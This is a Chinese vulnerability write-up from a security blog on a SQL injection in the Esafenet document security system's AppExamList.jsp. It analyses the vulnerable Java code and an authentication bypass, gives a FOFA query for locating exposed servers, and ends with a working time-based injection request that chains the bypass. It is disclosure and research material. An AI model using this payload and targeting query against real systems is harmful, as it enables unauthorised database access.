---
title: "亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/esafenet-AppExamList-sqli.html
asset_dir: assets/亿赛通电子文档安全管理系统-appexamlist.jsp-sql注入漏洞
---

# 亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/31 08:20
- 986浏览
- [2评论](#comment)
- 42分钟阅读

深入探索

数据库

SQL

软件

---

# 漏洞简介

亿赛通电子文档安全管理系统的AppExamList.jsp接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可以通过构造特定的POST请求，在多个参数如username、AppTate、startTime、endTime中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

安全运维咨询

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
>
> SQL注入检测工具

# 漏洞分析

深入探索

网络安全课程

云安全解决方案

文件大小转换

PS: 相关权限绕过简析如下

```
public class WebController extends HttpServlet {
    private static final Class[] SERVICE_PARAMS = new Class[]{HttpServletRequest.class, HttpServletResponse.class};

    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        Object[] actionParams = new Object[]{request, response};
        String actionName = request.getParameter("command");
        String fromurl = request.getParameter("fromurl");
        if (this.isRepeat(request) && fromurl != null && !"".equals(fromurl)) {
            request.getRequestDispatcher(fromurl).forward(request, response);
        } else if (actionParams != null && actionName != null && !"".equals(actionName) && !"null".equals(actionName)) {
            LoginMng loginMng = (LoginMng)request.getSession().getAttribute("loginMng");
            String clienturl = request.getRequestURI();
            if (clienturl != null && (clienturl.indexOf("login") != -1 || clienturl.indexOf("SystemConfig") != -1) || loginMng != null && loginMng.isLogin()) {
                try {
                    Method actionFunc = this.getClass().getDeclaredMethod("action" + actionName, SERVICE_PARAMS);
                    actionFunc.setAccessible(true);
                    actionFunc.invoke(this, actionParams);
```

深入探索

传输层安全性协议

企业安全咨询

安全认证考试

只要uri包含 login 或者 SystemConfig 即可满足条件，然后将action与传递进来的command进行拼接后反射调用对应的方法。

代码安全审计

直接看到 `AppExamList.jsp` 的实现逻辑

```
<%
        //        String username = RequestUtil.getParameter(request, "username", "");
        String username = request.getParameter("username");
        String AppTate = RequestUtil.getParameter(request, "AppTate", "3");
        String startTime = RequestUtil.getParameter(request, "startTime",
                        "");
        String endTime = RequestUtil.getParameter(request, "endTime", "");

        int currPage = RequestUtil.getIntParameter(request, "curpage", 1); //当前是第几页
        PageUtil pageutil = null;

        ApprovalDAO appdao = new ApprovalDAO();
        List list = new ArrayList();
        pageutil = appdao.getApprovalListbyUser(currPage,username, startTime, endTime,
                        "DecryptApp", AppTate);
```

深入探索

授权

SQL注入防护

服务器安全服务

多个参数如username、startTime、endTime这些会被带入`getApprovalListbyUser`方法，跟进查看`getApprovalListbyUser`实现方式

漏洞扫描服务

```
public PageUtil getApprovalListbyUser(int curPage, String AppUserID, String startime, String endtime, String AppCategory, String IsApproval) throws Exception {
    List<DecryptApplicationInfo> list = new ArrayList();
    StringBuffer sql = new StringBuffer();
    sql.append("select * from DecryptApplication where UserName='" + AppUserID + "'");
    if (startime != null && !startime.equals("")) {
        startime = startime + " 00:00:00";
        endtime = endtime + " 24:00:00";
        sql.append(" and applicateTime <='" + endtime + "' and applicateTime >='" + startime + "'");
    }

    if (IsApproval.equals("0")) {
        sql.append(" and IsApproval = '0' and HasExam = '1'");
    } else if (IsApproval.equals("1")) {
        sql.append(" and IsApproval = '1'");
    } else if (IsApproval.equals("2")) {
        sql.append(" and HasExam = '0'");
    }

    sql.append("  order by ApplicateTime desc");
    PageUtil pageutil = PageFactory.getInstance(sql.toString(), "Uniqueid", curPage);
    HashMap[] maps = null;
    maps = this.getCommonResults(pageutil.getNewSql());
    if (maps != null && maps.length > 0) {
        for(int i = 0; i < maps.length; ++i) {
            list.add(DecryptApplicationDao.MapToInfo(maps[i]));
        }
    }

    pageutil.setRecords(list);
    return pageutil;
}
```

可见参数`username`、`startTime`、`endTime`等全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
Host: esafenet.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=1'WAITFOR+DELAY'0%3a0%3a3'--
```

[![亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞](images/img-001-37b139c46ec2.webp)](https://image.mrxn.net/0542ff74495340bea3adb6e367cca094.webp)

成功延时 3 秒

编程

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
